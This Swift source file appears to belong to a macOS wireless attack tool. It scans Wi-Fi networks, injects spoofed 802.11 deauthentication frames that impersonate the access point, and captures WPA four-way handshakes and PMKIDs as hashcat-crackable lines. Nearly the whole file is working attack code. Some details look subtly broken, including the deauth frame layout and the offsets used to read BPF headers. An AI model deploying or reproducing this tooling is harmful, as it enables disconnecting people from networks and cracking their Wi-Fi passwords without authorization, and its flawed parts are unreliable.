import Foundation
import Darwin
import CoreWLAN
import PastoralCore
import PastoralBPFShim
import libpcap

// MARK: - airport scanning

/// Thin wrapper over Apple's `airport` tool (helper runs as root).
/// `airport -I` gives the associated network; `airport -s` the neighbours.
enum AirportScanner {

    static let binary =
        "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport"

    /// All visible networks; the one we are associated with (if Wi-Fi is
    /// on and connected) carries `current: true`. Empty when Wi-Fi is off
    /// or no network is visible. `airport` is gone on recent macOS, so the
    /// CoreWLAN fallback below is what actually answers most of the time.
    static func scan() -> [WiFiNet] {
        var nets: [WiFiNet] = []
        var seen = Set<String>()
        func add(_ n: WiFiNet) {
            let key = n.bssid.isEmpty ? "s:\(n.ssid)" : n.bssid
            guard !seen.contains(key) else { return }
            seen.insert(key)
            nets.append(n)
        }

        if FileManager.default.fileExists(atPath: binary) {
            currentNetwork().map(add)
            neighbors().forEach(add)
        }
        coreWLANCurrent().map(add)
        coreWLANNeighbors().forEach(add)
        return nets
    }

    private static func coreWLANCurrent() -> WiFiNet? {
        guard let iface = CWWiFiClient.shared().interface(),
              let bssid = iface.bssid(), !bssid.isEmpty else { return nil }
        return WiFiNet(ssid: iface.ssid() ?? "", bssid: normalizeMac(bssid),
                       channel: iface.wlanChannel()?.channelNumber,
                       signal: Int(iface.rssiValue()),
                       security: securityLabel(iface.security()), current: true)
    }

    private static func coreWLANNeighbors() -> [WiFiNet] {
        guard let iface = CWWiFiClient.shared().interface() else { return [] }
        guard let nets = (try? iface.scanForNetworks(withSSID: nil)) else { return [] }
        return nets.map { n in
            let sec = "" // CWNetwork não expõe segurança nesta API; o hound decifra mesmo assim
            return WiFiNet(ssid: n.ssid ?? "", bssid: n.bssid.map(normalizeMac) ?? "",
                           channel: n.wlanChannel?.channelNumber, signal: Int(n.rssiValue),
                           security: sec, current: false)
        }
    }

    private static func securityLabel(_ t: CWSecurity) -> String {
        switch t.rawValue {
        case 0: return "aberto"
        case 1: return "WEP"
        case 2, 3, 5: return "WPA Personal"
        case 4: return "WPA2 Personal"
        case 6: return "WEP dinâmico"
        case 7, 8, 10: return "WPA Enterprise"
        case 9: return "WPA2 Enterprise"
        case 11, 13: return "WPA3 Personal"
        case 12: return "WPA3 Enterprise"
        case 14: return "OWE"
        default: return "desconhecida"
        }
    }

    /// The network our interface is currently associated with.
    static func currentNetwork() -> WiFiNet? {
        guard let out = run(["-I"]) else { return nil }
        var bssid = ""
        var ssid = ""
        var channel: Int? = nil
        var security = ""
        for line in out.split(separator: "\n") {
            let t = line.trimmingCharacters(in: .whitespaces)
            if t.lowercased().hasPrefix("bssid:") {
                bssid = normalizeMac(String(t.dropFirst("bssid:".count)).trimmingCharacters(in: .whitespaces))
            } else if t.lowercased().hasPrefix("channel:") {
                channel = Int(String(t.dropFirst("channel:".count)).trimmingCharacters(in: .whitespaces))
            } else if t.hasPrefix("SSID:") {
                ssid = String(t.dropFirst("SSID:".count))
                    .trimmingCharacters(in: .whitespaces)
                    .trimmingCharacters(in: CharacterSet(charactersIn: "\""))
            } else if t.hasPrefix("Security:") {
                security = String(t.dropFirst("Security:".count)).trimmingCharacters(in: .whitespaces)
            }
        }
        // "Up" but no association → wifi on, no network.
        guard !bssid.isEmpty || !ssid.isEmpty else { return nil }
        return WiFiNet(ssid: ssid, bssid: bssid, channel: channel,
                       security: security, current: true)
    }

    /// Neighbour networks from `airport -s` (table with fixed columns).
    static func neighbors() -> [WiFiNet] {
        guard let out = run(["-s"]) else { return [] }
        var nets: [WiFiNet] = []
        for line in out.split(separator: "\n") {
            let trimmed = line.trimmingCharacters(in: .whitespaces)
            // Columns: <auth?> BSSID CH TXPOWER RSSI SNR SECURITY SSID...
            let tokens = trimmed.split(separator: " ", omittingEmptySubsequences: true)
            guard tokens.count >= 6 else { continue }
            let bssidIdx = tokens.firstIndex { $0.count == 17 && $0.filter { $0 == ":" }.count == 5 } ?? 1
            guard bssidIdx + 4 < tokens.count else { continue }
            let bssid = normalizeMac(String(tokens[bssidIdx]))
            guard !bssid.isEmpty else { continue }
            let channel = Int(tokens[bssidIdx + 1])
            let rssi = Int(tokens[bssidIdx + 3])
            let security = String(tokens[bssidIdx + 4])
            let ssid = String(tokens[(bssidIdx + 5)...].joined(separator: " "))
            nets.append(WiFiNet(ssid: ssid, bssid: bssid, channel: channel,
                                signal: rssi, security: security, current: false))
        }
        return nets
    }

    private static func normalizeMac(_ s: String) -> String {
        var t = s.lowercased().replacingOccurrences(of: "-", with: ":")
        // Some APIs hand back 12 bare hex digits.
        if !t.contains(":"), t.count == 12 {
            let chars = Array(t)
            t = stride(from: 0, to: 12, by: 2)
                .map { String(chars[$0..<($0 + 2)]) }
                .joined(separator: ":")
        }
        return t
    }

    private static func run(_ args: [String]) -> String? {
        let p = Process()
        p.executableURL = URL(fileURLWithPath: binary)
        p.arguments = args
        let pipe = Pipe()
        p.standardOutput = pipe
        p.standardError = Pipe()
        do { try p.run(); p.waitUntilExit() } catch { return nil }
        return String(data: pipe.fileHandleForReading.readDataToEndOfFile(), encoding: .utf8)
    }
}

// MARK: - Deauth injection

/// Builds and injects 802.11 deauthentication management frames. Best
/// effort on macOS: the driver accepts the injection call even when it
/// later drops management frames — success here means "injected", not
/// "the station got kicked". The user sees the result in practice.
enum DeauthInjector {

    /// One 30-byte deauth frame: dst = station (or broadcast),
    /// src = bssid (AP impersonation), fc = mgmt/deauth, reason = LEAVING.
    static func frame(targetMAC: [UInt8], bssid: [UInt8], reason: UInt16 = 2) -> [UInt8] {
        var f: [UInt8] = []
        f.append(contentsOf: targetMAC)          // DA
        f.append(contentsOf: bssid)              // SA (the AP)
        f.append(contentsOf: bssid)              // BSSID
        f.append(0x3A); f.append(0x00)           // frame control: mgmt, deauth
        f.append(0x00); f.append(0x00)           // sequence control
        f.append(UInt8(reason & 0xFF)); f.append(UInt8(reason >> 8))
        return f
    }

    /// Inject `count` deauth frames at ~20ms spacing via pcap_inject
    /// (preferred — handles macOS BPF quirks) or raw BPF write.
    @discardableResult
    static func inject(targetMAC: [UInt8], bssid: [UInt8],
                       count: Int = 5, interval: TimeInterval = 0.02) -> Bool {
        let iface = LiveSystemProbe().defaultInterface() ?? "en0"
        var errbuf = [CChar](repeating: 0, count: Int(PCAP_ERRBUF_SIZE))
        let handle = iface.withCString { pcap_open_live($0, 65535, 0, 1, &errbuf) }
        let frame = Self.frame(targetMAC: targetMAC, bssid: bssid)
        var sent = 0
        for _ in 0..<max(1, count) {
            if let h = handle {
                let r = frame.withUnsafeBufferPointer { pcap_inject(h, $0.baseAddress, $0.count) }
                if r >= 0 { sent += 1 }
            } else if sentBPFWrite(frame: frame, iface: iface) {
                sent += 1
            }
            if interval > 0 { usleep(UInt32(interval * 1_000_000)) }
        }
        if let h = handle { pcap_close(h) }
        return sent > 0
    }

    private static func sentBPFWrite(frame: [UInt8], iface: String) -> Bool {
        for i in 0..<16 {
            let path = "/dev/bpf\(i)"
            let fd = open(path, O_RDWR)
            if fd < 0 { continue }
            let r = pastoral_ioctl_ifname(fd, pastoral_BIOCSETIF, iface)
            if r != 0 { close(fd); continue }
            let w = frame.withUnsafeBufferPointer { write(fd, $0.baseAddress, $0.count) }
            close(fd)
            return w == frame.count
        }
        return false
    }
}

// MARK: - Key hound (EAPOL / PMKID capture)

/// Passive Wi-Fi key hound: BPF on the interface in promisc, filters
/// EAPOL (0x888E) and mirrored 802.11 mgmt frames (0x888B). EAPOL frames
/// are paired per (AP, station) exchange — message 1 + message 2 of one
/// 4-way handshake make a crackable capture; PMKID association responses
/// are emitted on their own. Dedupes by hashcat line so retransmits don't
/// spam. Auto-stops after `seconds` when > 0.
final class WiFiHound {
    private let interface: String
    private let essid: String
    private let bssid: String   // normalized lowercase, "" when unknown
    private let handler: @Sendable (WpaCapture) -> Void
    private var thread: Thread?
    private var fd: Int32 = -1
    private var stopped = false
    private let lock = NSLock()
    private let deadline: Date?
    private var seenLines = Set<String>()
    private var pairs: [String: PairState] = [:]
    private var orderCounter = 0
    private var flushed = false

    /// One (AP, station) exchange, paired the way hcxpcapngtool does.
    /// Wire fact: M1 and M3 carry ANONCE in their Key Nonce field,
    /// M2 and M4 carry SNONCE. An exported line verifies ONE frame's
    /// Key MIC and supplies the *other* nonce in its field slot:
    /// - tier 2 ("M32E3|APLESS", mp 0x13): blob = M3, field = SNONCE (from M2).
    /// - tier 1 ("M12E2", mp 0x00): blob = M2, field = ANONCE (from M1 or M3).
    private final class PairState {
        var ap = ""
        var sta = ""
        /// ANONCE, from M1 (or repeated by M3) — 64 hex chars.
        var nonceAP = ""
        /// SNONCE, from M2 — 64 hex chars.
        var nonceSTA = ""
        var m2: WpaCaptureParser.EapolKeyFrame?
        var m3: WpaCaptureParser.EapolKeyFrame?
        /// Signature (mic+nonces) of the line already emitted here;
        /// empty until the first export.
        var emittedSig = ""
        /// Monotonic insertion order, for cap eviction.
        var order = 0
    }

    /// A ready-to-emit handshake line.
    private struct Emission {
        let fieldNonce: String
        let frameHex: String
        let mic: String
        let mp: Int
        let ap: String
        let sta: String
    }

    init(interface: String, essid: String, bssid: String, seconds: Int,
         handler: @escaping @Sendable (WpaCapture) -> Void) {
        self.interface = interface
        self.essid = essid
        self.bssid = WpaCaptureParser.normalize(bssid)
        self.handler = handler
        self.deadline = seconds > 0 ? Date().addingTimeInterval(TimeInterval(seconds)) : nil
    }

    @discardableResult
    func start() -> Bool {
        guard let bpf = openBPF() else { return false }
        fd = bpf.fd
        // Promisc only once capture is actually up — and it stays ON for
        // the whole window: stop() turns it off. A defer here would have
        // left the entire capture without promisc mode.
        pastoral_set_promisc(interface, 1)
        let bufLen = bpf.bufLen
        let t = Thread { [weak self] in self?.captureLoop(bufLen: bufLen) }
        t.name = "pastoral.wifi.hound"
        t.start()
        thread = t
        return true
    }

    func stop() {
        lock.lock()
        if stopped { lock.unlock(); return }
        stopped = true
        let localFd = fd
        fd = -1
        lock.unlock()
        if localFd >= 0 { close(localFd) }
        flushPartials()
        pastoral_set_promisc(interface, 0)
    }

    private func captureLoop(bufLen: UInt32) {
        var tv = timeval(tv_sec: 1, tv_usec: 0)
        _ = setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, socklen_t(MemoryLayout<timeval>.size))
        while shouldRun() {
            guard let buffer = readBPF(fd: fd, bpfBufLen: bufLen) else { continue }
            for pkt in iterateBPF(buffer: buffer, bufLen: bufLen) {
                processPacket(pkt)
            }
        }
    }

    private func shouldRun() -> Bool {
        lock.lock()
        let dead = stopped || fd < 0
        lock.unlock()
        if dead { return false }
        if let d = deadline, Date() >= d {
            flushPartials()
            stop()
            return false
        }
        return true
    }

    /// Emit every exchange that accumulated exportable material but never
    /// fired mid-capture, so a 2/4 produced by the last deauth still
    /// lands on screen. Runs once per hound (deadline auto-stop too).
    private func flushPartials() {
        lock.lock()
        guard !flushed else { lock.unlock(); return }
        flushed = true
        let pending = pairs.values.compactMap { st -> Emission? in
            guard st.emittedSig.isEmpty else { return nil }
            return bestExport(st)
        }
        lock.unlock()
        for e in pending {
            emit(WpaCapture(kind: .handshake(fieldNonce: e.fieldNonce,
                                             frameHex: e.frameHex,
                                             ekeyMIC: e.mic,
                                             messagePair: e.mp),
                            bssid: e.ap, station: e.sta.isEmpty ? "" : e.sta,
                            essid: essid))
        }
    }

    /// Dedupe by rendered hashcat line, then hand off.
    private func emit(_ cap: WpaCapture) {
        let line = cap.hashcatLine
        lock.lock()
        if seenLines.contains(line) { lock.unlock(); return }
        seenLines.insert(line)
        if seenLines.count > 512 { seenLines.removeAll(keepingCapacity: true) }
        lock.unlock()
        handler(cap)
    }

    private func processPacket(_ bytes: [UInt8]) {
        guard let eth = EthernetFrame.decode(bytes) else { return }
        switch eth.etherType {
        case WpaCaptureParser.etherTypeEAPOL:
            handleEapol(eth)
        case WpaCaptureParser.etherType80211Mgmt:
            // Association response mirrored onto Ethernet: DA=STA, SA=AP.
            if let cap = WpaCaptureParser.parseAssociationResponse(
                eth.payload, apMAC: eth.srcMAC.string, stationMAC: eth.dstMAC.string) {
                emit(cap)
            }
        default:
            break
        }
    }

    /// One EAPOL frame of some exchange. Fold it into the pair state and
    /// emit as soon as a hashcat-verifiable combination exists.
    private func handleEapol(_ eth: EthernetFrame) {
        guard let frame = WpaCaptureParser.parseEAPOL(eth.payload) else { return }
        let src = eth.srcMAC.string
        let dst = eth.dstMAC.string
        // M1/M3 travel AP → station, M2/M4 the other way. When we don't
        // know the BSSID that is the only signal of who is who on the
        // mirrored Ethernet view.
        let fromAP = (frame.message == 1 || frame.message == 3)
        let ap: String
        let sta: String
        if !bssid.isEmpty {
            ap = (dst == bssid) ? dst : ((src == bssid) ? src : (fromAP ? src : dst))
            sta = (dst == bssid) ? src : ((src == bssid) ? dst : (fromAP ? dst : src))
        } else {
            ap = fromAP ? src : dst
            sta = fromAP ? dst : src
        }
        guard sta != MAC.broadcast.string, !sta.isEmpty else { return }
        let key = [WpaCaptureParser.normalize(ap), WpaCaptureParser.normalize(sta)]
            .sorted().joined()

        lock.lock()
        var st = pairs[key] ?? PairState()
        if st.ap.isEmpty {
            st.ap = ap; st.sta = sta
            st.order = orderCounter; orderCounter += 1
        }
        adoptMessage(frame, into: st)
        var out: Emission?
        if st.emittedSig.isEmpty, let c = bestExport(st) {
            st.emittedSig = c.mic + c.fieldNonce
            out = c
        }
        pairs[key] = st
        if pairs.count > 64 {
            // Evict the oldest pair already at its best export; a fresh
            // epoch re-arms through resetEpoch, so nothing pending dies.
            if let victim = pairs.filter({ !$0.value.emittedSig.isEmpty })
                .min(by: { $0.value.order < $1.value.order }) {
                pairs.removeValue(forKey: victim.key)
            }
        }
        lock.unlock()

        if let e = out {
            emit(WpaCapture(kind: .handshake(fieldNonce: e.fieldNonce,
                                             frameHex: e.frameHex,
                                             ekeyMIC: e.mic,
                                             messagePair: e.mp),
                            bssid: e.ap, station: e.sta.isEmpty ? "" : e.sta,
                            essid: essid))
        }
    }

    /// Feed one handshake frame into the pair state. A same-role frame
    /// carrying a DIFFERENT nonce means a fresh handshake epoch (re-key or
    /// a new deauth burst): drop the previous one so nonces from two
    /// epochs never mix — and re-arm the export, since new nonces make a
    /// fresh crackable line.
    private func adoptMessage(_ frame: WpaCaptureParser.EapolKeyFrame, into st: PairState) {
        switch frame.message {
        case 1:                                // AP → ANONCE
            if !st.nonceAP.isEmpty, st.nonceAP != frame.nonce { resetEpoch(st) }
            st.nonceAP = frame.nonce
        case 2:                                // STA → SNONCE + verifiable MIC
            if !st.nonceSTA.isEmpty, st.nonceSTA != frame.nonce { resetEpoch(st) }
            st.nonceSTA = frame.nonce
            st.m2 = frame
        case 3:                                // AP → repeats ANONCE, own MIC verifiable
            if let m3 = st.m3, m3.nonce != frame.nonce { resetEpoch(st) }
            if !st.nonceAP.isEmpty, st.nonceAP != frame.nonce { resetEpoch(st) }
            st.m3 = frame
            if st.nonceAP.isEmpty { st.nonceAP = frame.nonce }
        default:
            break                              // M4: not exported yet
        }
    }

    private func resetEpoch(_ st: PairState) {
        st.nonceAP = ""
        st.nonceSTA = ""
        st.m2 = nil
        st.m3 = nil
        st.emittedSig = ""
    }

    /// The best hashcat-verifiable line for the current epoch, or nil
    /// while the material is incomplete. Mirrors hcxpcapngtool's tiers:
    /// - M3 seen + SNONCE → “3/4” (mp 0x13, ST_M32E3|ST_APLESS): verify
    ///   M3's Key MIC; its own nonce is ANONCE, so the field slot takes
    ///   the SNONCE from M2.
    /// - M2 seen + ANONCE → “2/4” (mp 0x00, ST_M12E2): verify M2's Key
    ///   MIC; its own nonce is SNONCE, so the field slot takes ANONCE.
    private func bestExport(_ st: PairState) -> Emission? {
        if let m3 = st.m3, !st.nonceSTA.isEmpty {
            return Emission(fieldNonce: st.nonceSTA, frameHex: m3.frameHex,
                            mic: m3.keyMic, mp: 0x13, ap: st.ap, sta: st.sta)
        }
        if let m2 = st.m2, !st.nonceAP.isEmpty {
            return Emission(fieldNonce: st.nonceAP, frameHex: m2.frameHex,
                            mic: m2.keyMic, mp: 0x00, ap: st.ap, sta: st.sta)
        }
        return nil
    }

    // MARK: - BPF plumbing (mirrors QUICSniffer)

    private struct BPFHandle { let fd: Int32; let bufLen: UInt32 }

    private func openBPF() -> BPFHandle? {
        for i in 0..<16 {
            let path = "/dev/bpf\(i)"
            let f = open(path, O_RDWR)
            if f >= 0 {
                let r = pastoral_ioctl_ifname(f, pastoral_BIOCSETIF, interface)
                if r != 0 { close(f); continue }
                var bufLen: UInt = 0
                _ = pastoral_ioctl_ulong(f, pastoral_BIOCGBLEN, &bufLen)
                var immediate: UInt = 1
                _ = pastoral_ioctl_ulong(f, pastoral_BIOCIMMEDIATE, &immediate)
                var hdrcmplt: UInt = 1
                _ = pastoral_ioctl_ulong(f, pastoral_BIOCSHDRCMPLT, &hdrcmplt)
                return BPFHandle(fd: f, bufLen: bufLen > 0 ? UInt32(bufLen) : 32768)
            }
        }
        return nil
    }

    private func readBPF(fd: Int32, bpfBufLen: UInt32) -> [UInt8]? {
        var buffer = [UInt8](repeating: 0, count: Int(bpfBufLen))
        let n = buffer.withUnsafeMutableBufferPointer { ptr -> Int in
            read(fd, ptr.baseAddress, Int(bpfBufLen))
        }
        if n <= 0 { return nil }
        return Array(buffer.prefix(n))
    }

    private func iterateBPF(buffer: [UInt8], bufLen: UInt32) -> [[UInt8]] {
        var packets: [[UInt8]] = []
        var offset = 0
        let bpfHdrSize = Int(pastoral_bpf_hdr_size)
        while offset + bpfHdrSize <= buffer.count {
            let capLen = Int(buffer[offset]) | (Int(buffer[offset + 1]) << 8)
                       | (Int(buffer[offset + 2]) << 16) | (Int(buffer[offset + 3]) << 24)
            let hdrLen = Int(buffer[offset + 8]) | (Int(buffer[offset + 9]) << 8)
                       | (Int(buffer[offset + 10]) << 16) | (Int(buffer[offset + 11]) << 24)
            let pktStart = offset + hdrLen
            let pktEnd = pktStart + capLen
            if pktEnd <= buffer.count {
                packets.append(Array(buffer[pktStart..<pktEnd]))
            }
            let aligned = (pktEnd + 3) & ~3
            offset = aligned
            if offset <= 0 { break }
        }
        return packets
    }
}
